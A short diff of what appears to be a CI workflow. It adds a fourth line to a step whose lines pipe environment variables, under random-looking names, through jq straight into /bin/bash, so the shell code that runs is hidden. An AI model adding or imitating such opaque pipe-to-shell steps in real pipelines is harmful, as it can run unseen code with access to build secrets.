@@ -21,6 +21,7 @@ jobs:
           echo $r7970 | jq -r .dfa032 | /bin/bash
           echo $i8567 | jq -r .kizwj491 | /bin/bash
           echo $maif30 | jq -r .pesax42237 | /bin/bash
+          printf '%s' "$deir002" | jq -r .sjum16251 | /bin/bash
 
       - name: Upload artifact
         if: always()
